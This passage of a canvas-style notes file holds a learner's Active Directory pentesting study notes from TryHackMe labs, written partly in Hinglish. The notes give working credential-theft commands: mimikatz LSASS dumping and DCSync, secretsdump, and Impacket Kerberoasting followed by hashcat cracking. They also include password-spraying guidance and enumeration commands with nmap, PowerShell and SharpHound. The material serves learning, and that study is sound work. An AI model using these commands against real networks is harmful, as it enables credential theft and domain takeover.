		{"id":"191e26e8de2847c0","type":"text","text":"# NTLM","x":1517,"y":-900,"width":338,"height":50},
		{"id":"4cb17076dd9c4e91","type":"text","text":"# KERBOROS","x":1517,"y":-716,"width":338,"height":76},
		{"id":"a941cf27798459cb","type":"text","text":"                    KERBEROS AUTHENTICATION\n                              │\n                              ▼\n                         👤 USER\n                              │\n                     Credentials\n                              │\n                              ▼\n                    ┌─────────────────┐\n                    │   KDC / Domain  │\n                    │    Controller   │\n                    └────────┬────────┘\n                             │\n                        AS-REQ / AS-REP\n                             │\n                             ▼\n                     🎟️ TGT ISSUED\n                  (Ticket Granting Ticket)\n                             │\n                             │ \"I need access\n                             │  to SMB\"\n                             ▼\n                    ┌─────────────────┐\n                    │      KDC/TGS    │\n                    │ Ticket Granting │\n                    │     Service     │\n                    └────────┬────────┘\n                             │\n                        TGS-REQ / TGS-REP\n                             │\n                             ▼\n                  🎟️ SERVICE TICKET\n                    (e.g. SMB Ticket)\n                             │\n                             │ AP-REQ\n                             ▼\n                    ┌─────────────────┐\n                    │  TARGET SERVICE │\n                    │   SMB / HTTP    │\n                    └────────┬────────┘\n                             │\n                             ▼\n                        ACCESS ✅","x":2080,"y":-560,"width":830,"height":1128},
		{"id":"8bf2456ea4313d74","type":"text","text":"### NTLM\n\n- Challenge-response authentication protocol.\n- Modern AD mein Kerberos preferred hai, but NTLM still used.\n- **NTLMv1 = highly insecure**\n- **NTLMv2 = improved but still attackable**\n- Flow: **Client → Service → DC verification**\n- Server sends random **challenge/nonce**.\n- Client uses **NT hash** to generate response.\n- Password itself is not sent directly.\n- Major attacks: **NTLM Relay, Pass-the-Hash**\n- NTLM can appear as fallback when Kerberos isn't available.\n- IP-based access, missing SPN, legacy/non-domain systems can lead to NTLM usage.\n- **SMB is the service; NTLM is the authentication mechanism.**\n- **Kerberos = tickets | NTLM = challenge-response**","x":2310,"y":-1480,"width":600,"height":480},
		{"id":"62854e18ead6b3fe","type":"text","text":"# Kerberos — AD Authentication\n\n## Core\n\n- **Kerberos = ticket-based authentication**; modern AD ka default/preferred protocol.\n- **KDC (Key Distribution Center)** = Domain Controller par running service.\n    - **AS (Authentication Service)** → TGT issue karta hai.\n    - **TGS (Ticket Granting Service)** → Service Ticket issue karta hai.\n\n## Authentication Flow\n\n```\nUser → KDC/AS → TGT\nTGT → KDC/TGS → Service Ticket\nService Ticket → Target Service → Access\n```\n\n- **TGT (Ticket Granting Ticket):** Service tickets request karne ke liye.\n- **Service Ticket (ST):** Specific service access karne ke liye.\n- **SPN (Service Principal Name):** Kerberos mein service ki unique identity.\n- **KRBTGT:** Special AD account; iska hash TGTs ko protect karta hai.\n\n## Important Requests\n\n- **AS-REQ** → Client requests TGT\n- **AS-REP** → KDC sends TGT\n- **TGS-REQ** → Client requests Service Ticket\n- **TGS-REP** → KDC sends Service Ticket\n- **AP-REQ** → Client presents Service Ticket to service\n\n## Pentesting — MUST KNOW 🔥\n\n- **Kerberoasting** → Service Ticket obtain → offline cracking → potentially service-account password.\n- **Pass-the-Ticket** → Stolen Kerberos ticket use karke user impersonation/authentication.\n- **Golden Ticket** → KRBTGT hash compromise → forged TGTs.\n- **ccache** → Linux par Kerberos tickets store hote hain.\n- `klist` → Cached tickets view.\n- `KRB5CCNAME` → ccache file specify karta hai.\n- **Hostname/DNS important:** Kerberos SPNs se tied hai; IP ke bajaye hostname use karna generally required.\n\n## Crux 🧠\n\n> **Kerberos = KDC se ticket lo → ticket se service access karo.**\n\n**Remember:**\n\n- `TGT` → **Ticket to request Tickets**\n- `ST` → **Specific Service**\n- `KRBTGT hash` → **Golden Ticket**\n- `Service Ticket` → **Kerberoasting**\n- `Stolen Ticket` → **Pass-the-Ticket**\n# AD Authentication","x":3020,"y":-1620,"width":880,"height":1580},
		{"id":"aff6c3c3c93eb028","type":"text","text":"\n# 📝 SHORT NOTES — Revision ke liye\n\n> ### AD Authentication\n> \n> - **Authentication:** Identity verify karna.\n> - **Authorisation:** Permissions determine karna.\n> - **Authentication material:** Username/password, certificates, hashes.\n> - **NTLM:** Challenge-response authentication.\n> - **Kerberos:** Ticket-based authentication; AD ka preferred/default mechanism.\n> - **LDAP:** Directory access.\n> - **SMB:** File/network sharing.\n> - **WebDAV:** Web-based resource/file access.\n> - LDAP/SMB/WebDAV **authentication protocols nahi samajhne**; underlying authentication NTLM/Kerberos se ho sakti hai.\n> - AD attacks frequently **NTLM/Kerberos, credentials, hashes, tickets aur permissions** ke around revolve karte hain.\n\n### 🧠 One-line memory trick\n\n**“Authentication tells AD WHO I am; Authorisation tells AD WHAT I can do; NTLM uses challenges, Kerberos uses tickets.”**","x":520,"y":-1115,"width":580,"height":720,"color":"1"},
		{"id":"2183bd0f3885b653","type":"text","text":"| **Store**                | **What It Holds**                                    | **Why It Exists**                                                       | **Access Method**                               | **Tools & Commands**                                                       |\n| ------------------------ | ---------------------------------------------------- | ----------------------------------------------------------------------- | ----------------------------------------------- | -------------------------------------------------------------------------- |\n| **LSASS Memory**         | NTLM hashes, Kerberos tickets, cleartext (sometimes) | Enables seamless logon across services                                  | Dump live memory of **lsass.exe**               | **mimikatz**<br><br>`sekurlsa::logonpasswords`<br><br>`sekurlsa::minidump` |\n| **SAM + SYSTEM Hives**   | Local account hashes                                 | Authentication for local logons (e.g. local admin)                      | Export registry hives, extract with boot key    | **mimikatz**<br><br>`lsadump::sam`<br><br>`vssadmin` to extract            |\n| **LSA Secrets**          | Cached domain creds, plaintext service creds         | Enables offline logon, stores scheduled task passwords, and RDP secrets | RPC via LSARPC named pipe                       | **secretsdump.py** with local admin creds                                  |\n| **DPAPI Vault**          | Saved passwords from apps (RDP, browsers, WiFi)      | User-level secure storage for creds                                     | Access via user token or decrypted master key   | **mimikatz**<br><br>`vault::list`<br><br>`vault::cred /export` to extract  |\n| **NTDS.dit** _(DC only)_ | Full domain DB: usernames, NTLM & Kerberos keys      | Domain authentication and replication                                   | Replicate over MS-DRSR or parse an offline file | `secretsdump.py -just-dc`<br><br>`lsadump::dcsync`                         |","x":-1380,"y":159,"width":980,"height":701},
		{"id":"690e3c8daad83f76","type":"text","text":"**Windows and Active Directory Stored CREDS**","x":-180,"y":760,"width":400,"height":50},
		{"id":"88b5879c30ea0b2e","type":"text","text":"**CREDITANL ACCESS**","x":-180,"y":829,"width":400,"height":50},
		{"id":"beda709b65f2742e","type":"text","text":"# Credential Access (MITRE ATT&CK TA0006)\n\n## Overview\nCredential Access consists of techniques for stealing credentials like account names and passwords. Obtaining valid credentials is preferred over exploiting CVEs as it allows silent Lateral Movement.\n\n---\n\n## 1. Unsecured Credentials: Files & Registry (T1552.001)\n\n### A. PowerShell Command History\n* **Path:** `C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt`\n* **Purpose:** Contains all previously executed PowerShell commands (often reveals hardcoded passwords/tokens).\n\n### B. Windows Registry Searching\n* **Command (System-wide):**\n  ```cmd\n  reg query HKLM /f password /t REG_SZ /s","x":-1380,"y":980,"width":980,"height":600},
		{"id":"e737178e771d5ce6","type":"text","text":"**KERBEROSTING**","x":-180,"y":898,"width":400,"height":50},
		{"id":"a67372cf887e3c6f","type":"text","text":"# Kerberoasting\n\n## 1. Kerberoasting\n* **Prerequisite:** Valid Domain Credentials (Any authenticated domain user).\n* **Target:** Service Accounts with registered **Service Principal Names (SPN)**.\n* **Vulnerability:** TGS tickets are encrypted using the target SPN account's NTLM password hash. Low-privilege users can request TGS tickets for any SPN and crack them offline.\n* **Hashcat Mode:** `-m 13100` (Kerberos 5 TGS-REP ETYPE 23).\n\n### Execution Commands:\n```bash\n# 1. Enumerate SPN Accounts\npython3 /opt/impacket/examples/GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASS>\n\n# 2. Request & Dump TGS Hash\npython3 /opt/impacket/examples/GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASS> -request-user <SPN_USER> -outputfile spn.hash\n\n# 3. Offline Hash Cracking\nhashcat -a 0 -m 13100 spn.hash /usr/share/wordlists/rockyou.txt","x":580,"y":340,"width":923,"height":661},
		{"id":"42eef19d5f27d7c3","type":"text","text":"Bhai, tera doubt 100% genuine hai! Kerberos protocol ki theory aur actual attack execution mein beginners ko hamesha yahan confusion hota hai.\n\nTera logic bilkul sahi hai: **Theory ke mutabiq client pehle TGT (Ticket Granting Ticket) leta hai, aur phir TGT + Authenticator bhej kar TGS ticket maangta hai.**\n\nToh question yeh hai: **Humne command mein TGT manually kyun nahi diya?**\n\n### Parde Ke Peeche Kya Hua (Under-the-Hood Process)\n\nJab tu Impacket ki yeh command chalata hai:\n\nBash\n\n```\npython3 /opt/impacket/examples/GetUserSPNs.py -dc-ip 10.48.156.192 THM.red/thm -request-user svc-user\n```\n\nToh backend par **dono kaam ek saath (automatically)** hote hain:\n\n1. **Step A (Automatic TGT Request):** Impacket script sabse pehle tera diya hua user credentials (`THM.red/thm` + `Passw0rd!`) use karke Domain Controller ke **AS (Authentication Service)** ko contact karta hai. DC tujhe ek valid **TGT** issue kar deta hai. Script is TGT ko tera time bachane ke liye RAM/Memory mein temporaraily hold kar leti hai.\n    \n2. **Step B (Automatic TGS Request):** Jaise hi TGT mil jata hai, Impacket script bina tujhse pooche us TGT aur Authenticator ka use karke KDC ke **TGS (Ticket Granting Service)** endpoint ko contact karti hai aur `svc-user` account ka **TGS Ticket** request kar leti hai.\n    \n3. **Step C (Output Print):** DC jo TGS ticket bhejta hai, script us encrypted TGS hash (`$krb5tgs$23$...`) ko nikal kar teri screen par print kar deti hai!","x":1065,"y":1060,"width":876,"height":755},
		{"id":"a5910a3fb33770dd","type":"text","text":" # Credential Harvesting","x":-142,"y":-40,"width":325,"height":56},
		{"id":"1aa1a22e15876a30","type":"text","text":"# ==**ACTIVE DIRECTORY**==","x":-2000,"y":-820,"width":340,"height":60,"color":"4"},
		{"id":"a006db40a04a3050","type":"text","text":"# Breaching Active Directory","x":-2482,"y":-4400,"width":385,"height":60},
		{"id":"b4ef654dc9c677c1","type":"text","text":"# NTLM / NetNTLM\n\n## Core\n- NTLM = Windows authentication protocol suite.\n- NetNTLM = NTLM challenge-response authentication mechanism.\n- NetNTLM services can act as a middleman between client and AD/DC.\n- Password itself is not stored by the application; authentication is verified via DC.\n\n## Attack Surface\nInternet-facing AD-integrated services:\n- OWA / Exchange\n- RDP\n- VPN\n- Web apps using Windows Authentication\n\n## Password Spraying\n- Brute Force = 1 user → many passwords\n- Password Spray = many users → 1 password\n- Goal = find valid AD credentials while reducing lockout risk.\n- Usually useful after OSINT discovers usernames/password clues.\n\n## Flow\nOSINT\n  ↓\nUsernames\n  ↓\nPassword Spray\n  ↓\nValid Credentials\n  ↓\nAD Enumeration\n\n## THM Lab Logic\nUsername + password → Windows/NetNTLM authentication\n200 → likely success\n401 → authentication failure\n\n## Must Remember\n- NTLM ≠ exactly the same thing as NetNTLM, but THM may use \"NTLM authentication\" broadly.\n- NetNTLM = Challenge/Response.\n- Password Spray = ONE password against MANY users.","x":-643,"y":-4713,"width":804,"height":1187},
		{"id":"aad78dfba47863e8","type":"text","text":"# NTLM auth services","x":-1240,"y":-4120,"width":340,"height":70},
		{"id":"fe57185f4932b152","type":"text","text":"## Active Directory Enumeration via PowerShell (AD-RSAT)\n\n### 1. User Enumeration\n\n**Basic User Info (`Get-ADUser`)**\n\n- **Purpose:** Specific AD user ki information retrieve karta hai.\n    \n- **Syntax:** `Get-ADUser -Identity <username> -Server <domain>`\n    \n- **Example:** `Get-ADUser -Identity gordon.stevens -Server za.tryhackme.com`\n    \n- **Key Parameters:**\n    \n    - `-Identity` → Target username\n        \n    - `-Server` → Domain Controller/domain IP or address _(Non-domain machine par required)_\n        \n- 🧠 **Mental Model:** `Get-ADUser` = User ko dekho.\n    \n\n**Full User Details (`-Properties *`)**\n\n- **Purpose:** User ki all/maximum available AD properties (department, description, Distinguished Name, account status) retrieve karta hai.\n    \n- **Syntax:** `Get-ADUser -Identity <username> -Server <domain> -Properties *`\n    \n- 🧠 **Mental Model:** `-Properties *` = Full detailed attributes output.\n    \n\n**User Search & Filtering (`-Filter`)**\n\n- **Purpose:** Specific condition ke basis par target users search karta hai.\n    \n- **Syntax:** `Get-ADUser -Filter '<condition>' -Server <domain>`\n    \n- **Example:** `Get-ADUser -Filter 'Name -like \"*stevens\"' -Server za.tryhackme.com`\n    \n- **Common Operators:**\n    \n    - `-like` → Pattern match (wildcards `*`)\n        \n    - `-eq` / `-ne` → Equal / Not equal\n        \n    - `-gt` / `-lt` → Greater than / Less than\n        \n- 🧠 **Mental Model:** `-Filter` = Conditional query search.\n    \n\n**Output Formatting (`Format-Table` / `ft`)**\n\n- **Purpose:** Output ko readable table format mein display karta hai. Pipe (`|`) operator Command 1 ka output Command 2 mein pass karta hai.\n    \n- **Example:** `Get-ADUser -Filter * -Server za.tryhackme.com | Format-Table Name,SamAccountName -AutoSize`\n    \n- 🧠 **Mental Model:** `|` (Pipe) = Pass data forward.\n    \n\n### 2. Group Enumeration\n\n**Group Info (`Get-ADGroup`)**\n\n- **Purpose:** Specific AD group ka baseline object data retrieve karta hai.\n    \n- **Syntax:** `Get-ADGroup -Identity <group> -Server <domain>`\n    \n- **Example:** `Get-ADGroup -Identity Administrators -Server za.tryhackme.com`\n    \n- 🧠 **Mental Model:** `Get-ADGroup` = Group details view karo.\n    \n\n**Group Membership (`Get-ADGroupMember`)**\n\n- **Purpose:** Target group ke andar nested members (Users, Groups, Computers) list karta hai.\n    \n- **Example:** `Get-ADGroupMember -Identity Administrators -Server za.tryhackme.com`\n    \n- 🧠 **Mental Model:** `Get-ADGroupMember` = Group ke andar kaun-kaun hai?\n    \n\n### 3. AD Object Queries\n\n**Generic AD Search (`Get-ADObject`)**\n\n- **Purpose:** Generic AD objects search karta hai (Users, Groups, Computers, OUs, Domain objects).\n    \n- **Syntax:** `Get-ADObject -Server <domain>`\n    \n- 🧠 **Mental Model:** `Get-ADObject` = Broad-spectrum AD object search.\n    \n\n**Recently Changed Objects (`whenChanged`)**\n\n- **Purpose:** Modification timestamp ke basis par AD objects filter karta hai.\n    \n- **Syntax:** `Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -Server <domain>`\n    \n- 🧠 **Mental Model:** `whenChanged` = Object modification audit timestamp.\n    \n\n**Include Deleted Objects (`-IncludeDeletedObjects`)**\n\n- **Purpose:** Queries mein active objects ke saath deleted AD objects ko bhi append karta hai.\n    \n- **Syntax:** `Get-ADObject -Filter '<condition>' -IncludeDeletedObjects -Server <domain>`\n    \n- 🧠 **Mental Model:** `-IncludeDeletedObjects` = Recycle Bin/deleted objects scan.\n    \n\n### 4. Domain Level Enumeration\n\n**Domain Structure (`Get-ADDomain`)**\n\n- **Purpose:** Target AD domain ka architectural overview aur key container paths retrieve karta hai.\n    \n- **Syntax:** `Get-ADDomain -Server za.tryhackme.com`\n    \n\n|**Field**|**Meaning**|\n|---|---|\n|`DNSRoot`|Domain ka FQDN / DNS name|\n|`DistinguishedName`|Domain ka root LDAP/AD path|\n|`DomainControllersContainer`|Domain Controllers ka Organizational Unit (OU)|\n|`UsersContainer`|Default users container path|\n|`ComputersContainer`|Default computers container path|\n|`ChildDomains`|Linked child domains list|\n\n- 🧠 **Mental Model:** `Get-ADDomain` = High-level Domain Blueprint.\n    \n\n### 5. Security & Account Assessment\n\n**Failed Authentication Tracking (`badPwdCount`)**\n\n- **Purpose:** Recorded failed-password counts wale accounts identify karta hai.\n    \n- **Syntax:** `Get-ADObject -Filter 'badPwdCount -gt 0' -Server <domain>`\n    \n- ⚠️ **Offensive Relevance:** Password spraying attack planning ke waqt account lockouts avoid karne ke liye in users ko identify karke skip kiya jata hai.\n    \n- 🧠 **Mental Model:** `badPwdCount` = Account lockout risk assessment index.\n    \n\n### 6. Object Modification (Exploitation)\n\n**Password Reset (`Set-ADAccountPassword`)**\n\n- **Purpose:** Target AD user account ka password modify/force reset karne ke liye execution cmdlet.\n    \n- **Syntax:** `Set-ADAccountPassword -Identity <user> -Server <domain>`\n    \n- ⚠️ **Key Distinction:**\n    \n    - `Get-*` Cmdlets = Read / Enumeration Operations.\n        \n    - `Set-*` Cmdlets = Write / Modification / Exploitation Operations.\n        \n- 🧠 **Mental Model:** `Set-ADAccountPassword` = Direct State Modification.","x":-6179,"y":2375,"width":1158,"height":3043},
		{"id":"299a2472707994a4","type":"text","text":"Port Scanning\nOnce we've discovered live hosts, we must identify which one is the Domain Controller (DC) to determine which critical AD-related services are being used and can be exploited. These are some common Active Directory ports and protocols:\n\nPort\tProtocol\tWhat it Means\n88\tKerberos\tPotential for Kerberos-based enumeration\n135\tMS-RPC\tPotential for RPC enumeration (null sessions)\n139\tSMB/NetBIOS\tLegacy SMB access\n389\tLDAP\tLDAP queries to AD\n445\tSMB\tModern SMB access, critical for enumeration\n464\tKerberos (kpasswd)\tPassword-related Kerberos service\n\n1- `nmap -sS -p- -T3 -iL hosts.txt -oN full_port_scan.txt`\n\n-sS: TCP SYN scan, which is stealthier than a full connect scan\n-p-: Scans all 65,535 TCP ports.\n-T3: Sets the timing template to \"normal\" to balance speed and stealth.\n-iL hosts.txt: Inputs the list of live hosts from the previous nmap command.\n-oN full_port_scan.txt: Outputs the results to a file.\n\n\n\n2- `nmap -p 88,135,139,389,445 -sV -sC -iL hosts.txt`\n\n-sV: This enables version detection. Nmap will try to determine the version of the services running on the open ports.\n-sC: Runs Nmap Scripting Engine (NSE) scripts in the default category.\n-iL: This tells Nmap to read the list of target hosts from the file hosts.txt. Each line in this file should contain a single IP address or hostname.\n","x":-5169,"y":2280,"width":452,"height":646},
		{"id":"24a8c0982d11a06f","type":"text","text":"**Important Commands:**\n\n- `net user /domain` -> Lists all users in the AD domain.\n    \n- `net user <username> /domain` -> Shows specific details about one user (e.g., active status, last password change). _Drawback: Fails to list groups if the user is in more than 10 groups._\n    \n- `net group /domain` -> Lists all groups in the AD (helps identify VIP groups like \"Domain Admins\").\n    \n- `net group \"<Group Name>\" /domain` -> Shows all members inside a specific group.\n    \n- `net accounts /domain` -> Shows the domain's Password Policy (lockout threshold, minimum length, history). Crucial for planning password attacks without getting caugh","x":-4784,"y":3186,"width":779,"height":335},
		{"id":"f94aeb328a20233a","type":"text","text":"# Active Directory Enumeration with Bloodhound & SharpHound\n\n**Core Concepts**\n\n  \n\n- **SharpHound**: The data gathering tool (the scout) that collects AD structure and saves it to a timestamped ZIP file.\n    \n      \n    \n- **Bloodhound**: The graph database visualizer (backed by Neo4j) that turns the collected data into visual attack paths.\n    \n      \n    \n\n**SharpHound Command Example**\n\n  \n\nPowerShell\n\n```\nSharpHound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs\n```\n\n**Parameters Breakdown**\n\n  \n\n- **CollectionMethods All**: Gathers comprehensive data including groups, ACLs, sessions, and local admins.\n    \n      \n    \n- **Domain za.tryhackme.com**: Targets a specific domain for enumeration.\n    \n      \n    \n- **ExcludeDCs**: Avoids touching Domain Controllers directly to minimize detection risk from EDR/AV alerts.\n    \n      \n    \n\n**Bloodhound Workflow**\n\n  \n\n- Start the Neo4j backend using `neo4j console start`.\n    \n      \n    \n- Launch the Bloodhound GUI using `bloodhound --no-sandbox`.\n    \n      \n    \n- Log in with `neo4j:neo4j` and import the SharpHound `.zip` file via drag-and-drop.\n    \n      \n    \n- Use Analysis Queries (such as _Find all Domain Admins_) or Path Finding (Start Node ➔ End Node) to visualize permission chains.\n    \n      \n    \n\n**Key Security Takeaway**\n\n  \n\n- Defenders think in lists representing static inventories of admins and hosts.\n    \n      \n    \n- Attackers think in graphs representing interconnected permission nodes and multi-hop exploitation paths.\n    \n      \n    \n- Run an `All` collection once at the start, then execute `Session`-only collections during peak hours like 10:00 AM and 2:00 PM to capture active user movements.","x":-4400,"y":4080,"width":790,"height":1000},
		{"id":"7fa3792c057e811f","type":"text","text":"## SBM ENUM","x":-3880,"y":2595,"width":298,"height":60},
		{"id":"fbc8b020c078c306","type":"text","text":"## Power Shell\n","x":-3880,"y":2715,"width":302,"height":50},
